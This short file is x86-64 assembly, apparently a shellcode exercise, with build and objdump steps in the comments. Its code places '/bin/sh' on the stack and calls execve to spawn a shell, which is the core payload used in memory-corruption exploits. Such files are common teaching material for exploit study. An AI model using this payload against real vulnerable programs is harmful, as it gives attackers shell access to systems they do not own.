# 1) apt install nasm
# 2) nasm -f elf64 shellcode.s  && ld shellcode.o
# 3) ./a.out
# 4) objdump -d shellcode.o

section .text
  global _start
    _start:
      mov rsi, 0                ;arg1
      mov rdx, 0                ;arg2

      mov rbx, 0x68732f6e69622f ;"/bin/sh"
      push rbx
      mov rdi, rsp              ;arg0 = "/bin/sh"

      mov rax, 0x3b
      syscall
